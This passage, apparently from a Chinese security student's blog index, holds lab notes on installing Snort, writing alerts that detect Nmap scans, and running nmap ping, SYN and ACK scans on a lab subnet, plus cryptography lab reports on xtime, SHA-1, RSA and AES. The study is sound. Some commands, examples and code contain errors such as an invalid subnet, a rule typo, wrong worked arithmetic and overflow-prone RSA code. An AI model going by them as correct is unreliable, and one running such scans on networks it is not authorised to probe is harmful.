捕捉关键字Search记录打开Google网页的动作👉编写一个规则，通过捕捉关键字Search记录打开Google网页的动作，并将符合规则的数据包输出到Alert文件中 在Snort的Rules文件夹下创建myrule文件，输入如下内容： 1alert tcp any any -&gt; 172.16.68.139 any (msg:&quot;Google Search Query&quot;;content:&quot;search&quot;;nocase; sid:10000001;) sid snort id ,这个关键字被用来识别snort规则的唯一性。sid 的范围是如下分配的： &lt;100 保留做将来使用 100-1000,000 包含在snort发布包中 1000,000 作为本地规则使用 msg 标示一个消息. 但是规则中的msg不起作用，sid和msg的对应关系查阅sid-msg.map。 所以这里自定义了一个sid为10000001. 在Snort.conf文件中添加新建的规则文件 1include $RULE_PATH/myrule.rules 开启检测模式。打开浏览器，输入www.google.com到google页面。到Log文件夹下查看Alert文件，规则中的字符串已经被记录了下来，即Snort成功地检测到载入Google网页的动作，所定义的规则起到了预想的作用 1snort -i eth0 -c /snort-2.9.17/etc/snort.conf -A fast -l log/snort-detect/ 注意vm中宿主机和虚拟机的网络模式 尝试定义几个更为实用的规则，并在使用中检验它们的效果。👉在new.rules中添加如下3条规则： 123alert icmp any any -&gt; any any (dsize:0;itype:8;msg:&quot;NMAP PING SCAN&quot;; sid:1000002;)alert tcp any any -&gt; any any (flags:SF;msg:&quot;NMAP SYN FIN SCAN&quot;; sid:1000003; )aler tcp any any -&gt; any any (flags:A;ack:0;msg:&quot;NMAP TCP PING&quot;; sid:1000004) 运行Snort，在局域网另一台主机上运行Nmap，对主机进行端口扫描。首先使用Nmap的-sP选项进行ping扫描，然后使用-sS选项的SYN扫描，最后使用-sA选项进行ACK扫描。 nmap -sP 172.16.68.0/24 ping 扫描 sudo nmap -sS 172.16.68.0/24 SYN扫描 sudo nmap -sA 172.16.68.0/24 ACK扫描 扫描完成后，回到kali主机查看Alert文件。","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"入侵检测与取证","slug":"实验/入侵检测与取证","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"kali下snort简单的报警规则","slug":"kali下snort简单的报警规则","date":"2020-11-30T22:05:56.000Z","updated":"2024-11-12T06:59:32.000Z","comments":true,"path":"2020/12/01/kali下snort简单的报警规则/","permalink":"https://gryffinbit.top/2020/12/01/kali%E4%B8%8Bsnort%E7%AE%80%E5%8D%95%E7%9A%84%E6%8A%A5%E8%AD%A6%E8%A7%84%E5%88%99/","excerpt":"","text":"snort简单的报警规则在官网下载规则包（需要注册登陆）https://www.snort.org/downloads 我下载的是29151版本的 将snort安装目录的包用规则包进行替换 替换到snort-2.9.17文件夹内 练习一条规则👉在rules&#x2F;local.rules下进行规则配置。实现对内网的ICMP相关流量进行检测，并报警 编辑文件的时候都采用vim的方式 vim &lt;文件路径&gt; 以下操作都在snort的文件夹内完成。 cd &#x2F;snort-2.9.17 把下面的内容添加到local.rules里 1vim rules/local.rules 1alert icmp any any -&gt; 172.16.68.139 any (msg:&quot;ICMP&quot;;sid:41409) 测试规则，看是否有报错 小猪猪跑出来，成功运行 1snort -c rules/local.rules -T 利用Snort检测ping攻击在rules&#x2F;icmp-info.rules文件中设置如下规则： 1alert icmp any any -&gt; 172.16.68.139 any (msg:&quot;ICMP Large ICMP Packet&quot;;dsize:&gt;800;reference:arachoids,246; sid:499;rev:4;) tip：官方文档：This configuration file enables active response, to run snort in test mode -T you are required to supply an interface -i or test mode will fail to fully validate the configuration and exit with a FATAL error 检验规则是否报错： 1snort -c rules/icmp-info.rules -T 开启检测模式 1snort -i eth0 -c /snort-2.9.17/etc/snort.conf -A fast -l log/snort-detect/ ⛔️报错：Invalid keyword ‘preprocessor’ 官网下载的配置文件，默认把preprocessor reputation注释掉。找到这行。看配置文件，把preprocessor注释打开。 不设置黑白名单，可以把黑白名单注释掉。 ❗️注意！！！！！！！！！逗号问题！！！！在每个配置的最后一行，不能有,\\。 不然会出现类似这种的报错。莫名其妙的，天真的我之前还认真的去看了官网配置。。 再次运行监测模式 ⛔️报错：ERROR: Perfmonitor: Cannot open base stats file “&#x2F;var&#x2F;snort&#x2F;snort.stats”. Fatal Error, Quitting.. 💚打开sonrt.conf这行注释掉 # preprocessor perfmonitor: time 300 file &#x2F;var&#x2F;snort&#x2F;snort.stats pktcnt 10000 没有报错了！小猪猪跑出来，运行如德芙巧克力一般丝滑～尽享愉悦，纵享丝滑～ 在另一台主机上ping snort所在主机，log下面会生成警报日志 kali 上开启snort入侵检测 1snort -i eth0 -c /snort-2.9.17/etc/snort.conf -A fast -l log/snort-detect/ 另一台主机去ping 生成了alert警告日志 日志内记录的内容","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"入侵检测与取证","slug":"实验/入侵检测与取证","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"kali下snort数据包嗅探","slug":"kali下snort数据包嗅探","date":"2020-11-30T21:10:04.000Z","updated":"2024-11-12T06:59:31.000Z","comments":true,"path":"2020/12/01/kali下snort数据包嗅探/","permalink":"https://gryffinbit.top/2020/12/01/kali%E4%B8%8Bsnort%E6%95%B0%E6%8D%AE%E5%8C%85%E5%97%85%E6%8E%A2/","excerpt":"","text":"kali下snort数据包嗅探常用的命令 显示IP和TCP&#x2F;UDP&#x2F;ICMP包头信息 snort -v 显示应用层的数据，输出包头信息的同时显示包的数据信息 snort -vd 显示数据链路层的信息 snort -vde 更多命令参考snort手册http://www.kaiyuanba.cn/content/network/snort/Snortman.htm 仅捕获同组主机发出的icmp回显请求数据包。sudo snort -v 采用详细模式在终端显示数据包链路层、应用层信息sudo snort -vde 默认snort日志记录最后一级目录会以触发数据包的源IP命名。可使用组合键Ctrl+C停止snort运行。 查看Snort日志记录如果要把所有的包记录到硬盘上，你需要指定一个日志目录，snort就会自动记录数据包： 12345cd snort-2.9.17 # 定位到snort的文件夹mkdir log # 新建一个log目录，用于存放日志snort -vde -l log -h xxx.xxx.x.0/24 # 只对本地网络进行日志，告诉snort把进入C类网络&lt;本地IP&gt;的所有包的数据链路、TCP/IP以及应用层的数据记录到目录log中snort -l log -b #二进制的日志文件格式 网络速度很快，或者想使日志更加紧凑以便以后的分析，那么应该使用二进制的日志文件格式。所谓的二进制日志文件格式就是tcpdump程序使用的格式。该命令可以把所有的包记录到一个单一的二进制文件中 12ifconfig #查看本机IPsnort -vde -l log -h 172.16.68.139.0/24 # 只对本地网络进行日志。 在log中查看刚刚生成的日志 将log放入wireshark中进行查看","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"入侵检测与取证","slug":"实验/入侵检测与取证","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"kali安装配置snort","slug":"kali安装配置snort","date":"2020-11-30T21:02:46.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2020/12/01/kali安装配置snort/","permalink":"https://gryffinbit.top/2020/12/01/kali%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEsnort/","excerpt":"","text":"kali 下snort安装软件包，配置环境实验环境：kali-linux-2020.1 debian8 安装snort及其依赖包在官网上下载snort, daq https://www.snort.org/downloads 1234567891011snort-2.9.17.tar.gzdaq-2.0.7.tar.gz进行安装包解压：tar -zxvf snort-2.9.17.tar.gztar -zxvf daq-2.0.7.tar.gz 安装daq所依赖的开发包 12345Apt-get install flexApt-get install bisonApt-get install libpcap-dev 对dag包进行编译 123cd daq-2.0.7./configure &amp;&amp; make &amp;&amp; make install 安装snort所依赖的软件包 123456Apt-get isnatll libpcre3-devApt-get install libdumbnet-devApt-get install zlib1g-dev 对snort包进行编译 123cd snort-2.9.17./configure --enable-sourcefire --disable-open-appid &amp;&amp; make &amp;&amp; sudo make install","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"入侵检测与取证","slug":"实验/入侵检测与取证","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"kali安装gmpy2","slug":"kali安装gmpy2","date":"2020-11-30T20:00:50.000Z","updated":"2024-11-12T06:59:34.000Z","comments":true,"path":"2020/12/01/kali安装gmpy2/","permalink":"https://gryffinbit.top/2020/12/01/kali%E5%AE%89%E8%A3%85gmpy2/","excerpt":"","text":"kali-安装gmpy2安装环境gcc 原版本9.2 安装gmp包：12345wget [https://gmplib.org/download/gmp/gmp-6.2.0.tar.xz](https://gmplib.org/download/gmp/gmp-6.2.0.tar.xz)tar xvf gmp-6.2.0.tar.xzcd gmp-6.2.0./configure --prefix=/usr/local/gmp ⛔️报错：No usable m4 in $PATH or &#x2F;usr&#x2F;5bin (see config.log for reasons) 12345cdsudo apt-get install m4cd gmp-6.2.0./configure --prefix=/usr/local/gmpmake &amp;&amp; make install 安装mpfr包：12345wget https://www.mpfr.org/mpfr-current/mpfr-4.1.0.tar.gztar xvf mpfr-4.1.0.tar.gzcd mpfr-4.1.0./configure --prefix=/usr/local/mpfr --with-gmp=/usr/local/gmpmake &amp;&amp; make install 安装mpc apt-get的方式下载 1apt-get install libmpc-dev 会同时安装libmpfr-dev 1apt-get install libgmp-dev 报错 1apt-get update 1apt-get install libgmp-dev 成功 1234wget ftp://ftp.gnu.org/gnu/mpc/mpc-1.0.3.tar.gztar xvf mpc-1.0.3.tar.gzcd mpc-1.0.3./configure --prefix=/usr/local/mpc --with-gmp=/usr/local/gmp --with-mpfr=/usr/local/mpfr make &amp;&amp; make install error: conflicting types for ‘mpfr_fmma’ 不要管这个报错，是个软连接的问题。很麻烦。 安装gmpy2pip install gmpy2 tip：其他下载mpc的方式在文件夹内输入地址。mpc下载 获取GCC基础架构： 12[ftp://gcc.gnu.org/pub/gcc/infrastructure/](ftp://gcc.gnu.org/pub/gcc/infrastructure/)将下载文件放在临时目录中(您可以使用所需的任何目录)。 12/opt/downloads在与downloads目录或其子目录不同的temp目录中构建基础结构： 123/tmp/gcc使用静态库配置基础架构，如下所示：./configure --disable-shared --enable-static --prefix=/tmp/gcc","categories":[{"name":"密码学","slug":"密码学","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"gmpy2","slug":"gmpy2","permalink":"https://gryffinbit.top/tags/gmpy2/"}],"author":"Gryffinbit"},{"title":"图片拼接","slug":"图片拼接","date":"2020-11-14T21:03:28.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2020/11/15/图片拼接/","permalink":"https://gryffinbit.top/2020/11/15/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435import PIL.Image as Imageimport os IMAGES_PATH = &#x27;./就这?/&#x27; # 图片集地址IMAGES_FORMAT = [&#x27;.jpg&#x27;, &#x27;.JPG&#x27;, &#x27;png&#x27;] # 图片格式IMAGE_WIDTH = 15 # 每张图片的宽度IMAGE_HEIGHT = 15 # 每张图片的高度IMAGE_ROW = 21 # 图片间隔，也就是合并成一张图后，一共有几行IMAGE_COLUMN = 21 # 图片间隔，也就是合并成一张图后，一共有几列IMAGE_SAVE_PATH = &#x27;final2.jpg&#x27; # 图片转换后的地址 # 获取图片集地址下的所有图片名称image_names = [name for name in os.listdir(IMAGES_PATH) for item in IMAGES_FORMAT if os.path.splitext(name)[1] == item]image_names.sort(key=lambda x: int(x[4:-4])) #按文件的序号排序，从文件名正数的第4位到倒数的第4位取整数print(len(image_names)) # 简单的对于参数的设定和实际图片集的大小进行数量判断if len(image_names) != IMAGE_ROW * IMAGE_COLUMN: raise ValueError(&quot;合成图片的参数和要求的数量不能匹配！&quot;) # 定义图像拼接函数def image_compose(): to_image = Image.new(&#x27;RGB&#x27;, (IMAGE_COLUMN * IMAGE_WIDTH, IMAGE_ROW * IMAGE_HEIGHT)) #创建一个新图 # 循环遍历，把每张图片按顺序粘贴到对应位置上 for y in range(1, IMAGE_ROW + 1): for x in range(1, IMAGE_COLUMN + 1): from_image = Image.open(IMAGES_PATH + image_names[IMAGE_COLUMN * (y - 1) + x - 1]).resize( (IMAGE_WIDTH, IMAGE_HEIGHT),Image.ANTIALIAS) to_image.paste(from_image, ((x - 1) * IMAGE_WIDTH, (y - 1) * IMAGE_HEIGHT)) return to_image.save(IMAGE_SAVE_PATH) # 保存新图image_compose() #调用函数","categories":[{"name":"Misc","slug":"Misc","permalink":"https://gryffinbit.top/categories/Misc/"}],"tags":[{"name":"图片","slug":"图片","permalink":"https://gryffinbit.top/tags/%E5%9B%BE%E7%89%87/"},{"name":"Python","slug":"Python","permalink":"https://gryffinbit.top/tags/Python/"}],"author":"Gryffinbit"},{"title":"xtime算法","slug":"xtime算法","date":"2020-11-14T19:57:37.000Z","updated":"2024-11-12T06:59:01.000Z","comments":true,"path":"2020/11/15/xtime算法/","permalink":"https://gryffinbit.top/2020/11/15/xtime%E7%AE%97%E6%B3%95/","excerpt":"","text":"xtime算法理论基础： C(x)&#x3D;A(x)B(x) mod P(x)二进制数转换为多项式:A(a7,a6,a5,a4,a3,a2,a1,a0)&#x3D;&#x3D;&gt;A(X)&#x3D;a7x7+a6x6+a5x5+a4x4+a3x3+a2x2+a1x+a0，GF(28)内的最大值为(11111111)2&#x3D;&#x3D;&gt; x7+x6+x5+x4+x3+x2+x+1，P(x)&#x3D;x8+x4+x3+x2+x+1&#x3D;&#x3D;&gt;(100011011)2&#x3D;0x11BX8 mod P(x)&#x3D; x4+x3+x2+x+1——————x8除以P(x)的余数异或运算：0⊕0&#x3D;0, 0⊕1&#x3D;1, 1⊕1&#x3D;0有限域GF(2n)加法：C(x)&#x3D;A(x)+B(x)&#x3D;∑cixi(0≤i≤m-1)，ci&#x3D;ai+bi mod 2即ai⊕bi，A(x)&#x3D;(am-1,…,a3,a2,a1,a0)2，B(x)&#x3D;(bm-1,…,b3,b2,b1,b0)2定义xtime()运算：设A(x)∈GF(28),A(x)&#x3D;a7x7+a6x6+a5x5+a4x4+a3x3+a2x2+a1x+a0对应的二进制数为(a7,a6,a5,a4,a3,a2,a1,a0)则xtime(A(x))&#x3D;xA(x)&#x3D; a7x8+a6x7+a5x6+a4x5+a3x4+a2x3+a1x2+a0x对应的二进制数为(a7,a6,a5,a4,a3,a2,a1,a0,0)。将A(x)左移一位(最低位补0，原先的最高位删除)的结果为(a6,a5,a4,a3,a2,a1,a0,0)，如果a7&#x3D;0，则A(x)左移一位的结果就是xtime(A(x))的值；如果a7&#x3D;1,则A(x)左移一位的结果与0x1B逐比特异或(异或运算符⊕)即为xtime(A(x))的值。(a7&#x3D;1时，x*A(x)的值超出GF(28)，需要 模P(x),结果为A(x) 左移一位的结果为(a6,a5,a4,a3,a2,a1,a0,0)与0x1B逐比特异或的值)例题： 例题1： 设0x64∈GF(28)，求xtime(0x64)的值？0x64转换为二进制数为(0110 0100)2，最高位a7&#x3D;0,所以0x64左移一位的结果就是所求值，(0110 0100)2左移一位后的值为(110 01000)2例题2： 在GF(28)中计算0x570x13的结果？先将166进制数转换为二进制数：0x57&#x3D;(0101 0111)2,0x13&#x3D;(0001 0011)2将二进制数转换为多项式：0x13&#x3D;x4+x+10x570x13&#x3D;0x57*(x4+x+1)&#x3D;0x57x4+0x57x+0x570x57x就是xtime(0x57)&#x3D;(1010 1110)20x57x2就是xtime(0x57x)&#x3D;(0101 1100)+(0001 1011)&#x3D;(0100 0111)2同理0x57x3&#x3D;(10001110)2,，0x57x4&#x3D;(0000 0111)2所以0x570x13&#x3D;(00000111)2+(1010 1110)2+(0101 0111)2","categories":[{"name":"密码学","slug":"密码学","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[],"author":"Gryffinbit"},{"title":"SHA-1","slug":"SHA-1","date":"2020-11-14T19:44:46.000Z","updated":"2024-11-12T06:59:22.000Z","comments":true,"path":"2020/11/15/SHA-1/","permalink":"https://gryffinbit.top/2020/11/15/SHA-1/","excerpt":"","text":"SHA-1实验报告一、实验题目SHA-加密算法 二、实验目的和要求熟悉SHA-1算法的运行过程，使用C++语言编写实现SHA-1算法程序，增加对摘要函数的理解。 理解 SHA-1 轮函数的定义和工作过程。实现 SHA-1 哈希算法。分析 SHA-1 算法运行性能。 三、实验环境clion 四、实验内容给定的 SHA-1 对单个 512 分组处理结构如图，程序完成功能： 五、算法描述及实验步骤（1） 消息填充：消息转化为位字符串；字符串补位；附加消息长度。 （2） 初始化缓存：5 个 32 位的缓存字，大端填充。 （3） 设置必要操作和函数：循环左移位，轮常量K𝑡，轮逻辑函数（每 20 步 更新一个） （4） 16 个消息字扩展为 80 个字 （5） 80 步迭代：消息字，左移循环，逻辑函数，轮常量，更新缓存字。 𝐴, 𝐵, 𝐶,𝐷, 𝐸 ← (𝐸 + 𝑓𝑡(𝐵, 𝐶,𝐷) + 𝐶L𝑆5(𝐴) + 𝑊𝑡 + 𝐾𝑡), 𝐴, 𝐶L𝑆30(𝐵), 𝐶,𝐷 （6） 而后再用缓存字初始值异或输出 160 位摘要。 六、调试过程及结果（附截图）✨LPTSTR 替换为 char* ✨输出结果 七、总结体会❓代码如何实现消息初始填充的过程？ 消息填充：消息转化为位字符串；输入是按 512 位（16个字）的分组进行处理的。字符串补位；附加消息长度。 补位 原始消息必须进行补位，以使其长度在对512取模以后的余数是448。也就是说，（补位后的消息长度）%512 &#x3D; 448。即使长度已经满足对512取模后余数是448，补位也必须要进行。 补位是这样进行的：先补一个1，然后再补0 ，直到长度满足对512取模后余数是448。总而言之，补位是至少补一位，最多补512位。 补长度 就是将原始数据的长度补到已经进行了补位操作的消息后面。通常用两个字（64位）来表示原始消息的长度。如果消息长度不大于2^64，那么第一个字就是0。","categories":[{"name":"密码学","slug":"密码学","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"SHA-1","slug":"SHA-1","permalink":"https://gryffinbit.top/tags/SHA-1/"},{"name":"散列函数","slug":"散列函数","permalink":"https://gryffinbit.top/tags/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0/"}],"author":"Gryffinbit"},{"title":"RSA实验","slug":"RSA实验","date":"2020-11-14T19:32:14.000Z","updated":"2024-11-12T06:59:24.000Z","comments":true,"path":"2020/11/15/RSA实验/","permalink":"https://gryffinbit.top/2020/11/15/RSA%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"一、实验题目RSA加密算法 二、实验目的和要求熟悉RSA加解密算法的运行过程，使用C++语言编写实现RSA算法程序，加深对素数筛选和使用的理解。 三、实验环境clion 四、实验内容给定 RSA 算法结构 一、参数和密钥生成： 1.随机两个大素数𝑝和𝑞，保密； 计算𝑛 &#x3D; 𝑝 × 𝑞，公开。计算欧拉函数𝜑(𝑛) &#x3D; (𝑝 − 1)(𝑞 − 1)。 3.随机选取整数𝑒，gcd(𝑒,𝜑(𝑛)) &#x3D; 1。 4.计算d： $$d&#x3D;e^{-1}mod \\ \\varphi(n)$$ 5.公钥为（𝑒, 𝑛），私钥为（𝑑，n）。 二、加密： $$c\\equiv m^emod\\ n$$ 三、解密： $$m\\equiv c^d mod\\ n$$ 实现功能： （1） RSA 算法密钥生成，存放两个不同文件。 （2） RSA 加密文件，读入公钥文件，读入待加密文件，输出密文文件。 （3） RSA 解密文件，读入私钥文件，读入待解密文件，输出明文文件。 五、算法描述及实验步骤寻找大素数p、q：（产生新密钥时） 随机选取奇数，在素性检验算法判断是否为素数。重复操作，直到选取出符合条件的素数。 随机选取整数𝑒: $$gcd(e,\\varphi(n))&#x3D;1$$ $$d&#x3D;e^{-1}mod \\ \\varphi(n)$$ 由推广Euclid算法完成 六、调试过程及结果（附截图）✨ int64 的规范写法： int64_t ✨ unsigned __int64_t a 替换为 u_int64_t ✨64位长整型，Linux&#x2F;macOS下改成%lld ✨NULL的规范使用，改为nullptr 加密内容：pleas 对应为：1612050119 七、总结体会❓代码如何进行素性检测，如何进行模幂运算，加解密文件的策略？ ‼️素性检验： 质数筛选定理：n不能够被不大于根号n的任何质数整除，则n是一个质数 m&#x3D;(__int64_t)sqrt(n)+1 所以Primer[i]&lt;&#x3D;m ，当不能被n整除时，return true则n是质数。 12345678bool RSA::IsPrimer(__int64_t n)&#123; __int64_t m=(__int64_t)sqrt(n)+1,i; for(i=0;Primer[i]&lt;=m;i++) if(n%Primer[i]==0) return false; return true;&#125; ‼️模𝜑(𝑛)运算：采用一般取模的方式 $$（a^n) %m&#x3D; ((a%m)^n)%m \\ \\ \\ \\ \\ \\ \\ \\ \\ 循环n次取模，折半查找 $$ 12345678910111213__int64_t RSA::Mod(u_int16_t a,u_int16_t b,u_int16_t n)&#123; u_int16_t t=1; a%=n; while(b) &#123; if(b%2) t=(t*a)%n; a=(a*a)%n; b/=2; &#125; return (__int64_t)t;&#125; ‼️加解密文件的策略： 利用fread、fwrite等函数，读取公私钥，根据前面提到的加解密算法，进行操作。并将结果fwrite写入到文本中","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"密码学","slug":"实验/密码学","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://gryffinbit.top/tags/RSA/"}],"author":"Gryffinbit"},{"title":"AES实验报告","slug":"AES实验","date":"2020-11-14T19:24:19.000Z","updated":"2024-11-12T06:59:50.000Z","comments":true,"path":"2020/11/15/AES实验/","permalink":"https://gryffinbit.top/2020/11/15/AES%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"AES实验报告一、实验题目AES加密算法 二、实验目的和要求通过实验，掌握AES密码的程序实现，熟悉比特串的操作，矩阵变换，有限域上的乘法，提高C++程序设计能力. 编写 AES 密码的加密解密程序，运行并验证。 (1) 输入 128 比特明文和密文，利用 AES 密码对其加密并输出密文。 (2) 输入 AES 加密的 128 比特密文和密钥，对其进行解密。 (3) 记录调试和验证过程，完成实验报告。 三、实验环境clion 四、实验内容1. AES 算法： 包括：字节代换，行移位，列混合，密钥加。 128 比特的种子密钥𝑁𝑘 &#x3D; 4，即 4 个 32 比特的密钥字，每个密钥字是由 4 个字 节构成，形成 4×4 的矩阵。一个字 4 行，4 个字 4 列。 128 比特的分组长度𝑁𝑏 &#x3D; 4，即 4 个 32 比特的字，每个字是由 4 个字节构成， 形成 4×4 的矩阵。一个字 4 行，4 个字 4 列。 矩阵按照列为主索引，第一行，0，4，8，12。 2. 每一个元素的运算具体涉及有限域的乘法，幂运算，求逆元。 表示一个元素：两个 16 进制，8 位，一个字节。 五、算法描述及实验步骤1234567891011121.KeyExpansions—-轮密钥使用Rijndael算法的密钥编排密码密钥导出。 AES需要为每个回合加一个单独的128位的循环密钥块2.AddRoundKey—密钥加：将轮密钥与状态进行逐比特异或3.轮函数部分： SubBytes—-S盒：非线性替代步骤，其中根据查找表将每个字节替换为另一个。 ShiftRows—-行移位：一种转置步骤，其中状态的最后三行循环地移动一定数量的步骤。 MixColumns—列混淆：其操作在状态的列上，组合每列中的四个字节。 AddRoundKey--密钥加 最后一轮： SubBytes ShiftRows AddRoundKey AES轮函数过程：字节替换（SubBytes）：S盒把字节映射到自己的乘法逆元，再对字节做仿射变换 行移位（ShiftRows）：将状态阵列的各行，进行循环移位。不同行位移量不同。位移量的取值与Nb有关 列混淆（MixColumns）：将状态阵列视为多项式，与固定多项式进行模的乘法。且要求可逆 密钥加（AddRoundKey）：将轮密钥与状态进行逐比特异或。长度&#x3D;分组长度Nb。密钥加的逆运算是自己。 算法中间结果的分组为状态 密钥编排：密钥扩展： 由种子密钥扩展，以四字节为元素的一维阵列。轮密钥的总比特数&#x3D;Nb✖️（轮数 +1）。Nk为列数，前Nk个字为种子密钥。 $$W[N_b*(N_r+1)]$$ Nk≤6: W[i]&#x3D;Nk个字长的一段首尾两个字异或； 为Nk整倍时，先将前一个字w[i-1]进行变换：一字节循环移位RotByte → S盒SubByte → 异或常数Rcon[i&#x2F;Nk] Nk&gt;6: Nk整倍数保持一致。 除Nk余4时，w[i-1]执行SubByte 轮密钥选取： 轮函数的选取，从扩展密钥中选每轮选Nb长度的，如此往复。 六、调试过程及结果（附截图）⭐️运行时遇到：This file does not belong to any project target code insight 在cmake文件中，add_executable把fields.cpp添加进去 1✨✨ **调试成功✨✨** 1✨✨**运行结果**✨✨ ☀️☀️修改了main部分，以字符形式输出 1234567891011121314151617181920212223242526272829303132int main()&#123; unsigned char p[16] = &quot;HHelloWorldFine&quot;; unsigned char k[16] = &#123;0x1d,0x25,0xc9,0xf2,0xf4,0x17,0xc4,0x1b,0xcf,0x19,0x02,0x02,0x1f,0x1c,0xf0,0x11&#125; ; unsigned char c[16] ; unsigned char rk[11][16] ; unsigned char pp[16] ; KeyExpansion(k,rk) ; printf(&quot;需加密的明文是:\\\\t&quot;) ;// for( int i = 0 ; i &lt; 16 ; i ++ )// printf(&quot;%02x,&quot;,p[i]); printf(&quot;%s&quot;,&amp;p) ; printf(&quot;\\\\n&quot;) ; AES(p,c,rk,10) ; printf(&quot;加密后的密文是:\\\\t&quot;) ;// for( int j = 0 ; j &lt; 16 ; j ++ )// printf(&quot;%02x,&quot;,c[j]) ; printf(&quot;%s&quot;,&amp;c); printf(&quot;\\\\n&quot;) ; InvAES(c,pp,rk,10) ; printf(&quot;解密后的明文是:\\\\t&quot;) ;// for( int m = 0 ; m &lt; 16 ; m ++ )// printf(&quot;%02x,&quot;,pp[m]) ; printf(&quot;%s&quot;,&amp;pp); printf(&quot;\\\\n&quot;) ; return 0 ;&#125; 七、总结体会❓代码如何进行有限域的乘法？ 第1步将数字转换成多项式表达式；第2步是常规的乘法运算，即将多项式乘法展开； 第3步与既约多项式； xtime(·)算法： 求一个数x与0x02的乘积，一般求一个数的2倍，都是左移一位，在有限域内，要计算有限域的乘法，必须先确定一个GF上的8次不可约多项式，Rijndael密码中，这个多项式确定为x^8+x^4+x^3+x+1 在二进制中，所有的数都能用0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80异或得到，0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80的二进制表示如下： 而任何一个数x和a相乘都可以表示为 $$x *a&#x3D;x(08\\oplus02\\oplus04\\oplus01\\oplus80）$$ 计算出：则所有乘法结果都可以得到 这种方式，可以用矩阵表示出来 1234567891011121314151617181920212223////*****************************列混合*********************************////void MixColumns( unsigned char *a )&#123; unsigned char b[16] ; b[ 0] = S2[a[ 0]] ^ S3[a[ 1]] ^ a[ 2] ^ a[ 3] ; b[ 1] = S2[a[ 1]] ^ S3[a[ 2]] ^ a[ 3] ^ a[ 0] ; b[ 2] = S2[a[ 2]] ^ S3[a[ 3]] ^ a[ 0] ^ a[ 1] ; b[ 3] = S2[a[ 3]] ^ S3[a[ 0]] ^ a[ 1] ^ a[ 2] ; b[ 4] = S2[a[ 4]] ^ S3[a[ 5]] ^ a[ 6] ^ a[ 7] ; b[ 5] = S2[a[ 5]] ^ S3[a[ 6]] ^ a[ 7] ^ a[ 4] ; b[ 6] = S2[a[ 6]] ^ S3[a[ 7]] ^ a[ 4] ^ a[ 5] ; b[ 7] = S2[a[ 7]] ^ S3[a[ 4]] ^ a[ 5] ^ a[ 6] ; b[ 8] = S2[a[ 8]] ^ S3[a[ 9]] ^ a[10] ^ a[11] ; b[ 9] = S2[a[ 9]] ^ S3[a[10]] ^ a[11] ^ a[ 8] ; b[10] = S2[a[10]] ^ S3[a[11]] ^ a[ 8] ^ a[ 9] ; b[11] = S2[a[11]] ^ S3[a[ 8]] ^ a[ 9] ^ a[10] ; b[12] = S2[a[12]] ^ S3[a[13]] ^ a[14] ^ a[15] ; b[13] = S2[a[13]] ^ S3[a[14]] ^ a[15] ^ a[12] ; b[14] = S2[a[14]] ^ S3[a[15]] ^ a[12] ^ a[13] ; b[15] = S2[a[15]] ^ S3[a[12]] ^ a[13] ^ a[14] ; for( int i = 0 ; i &lt; 16 ; i ++ ) a[i] = b[i] 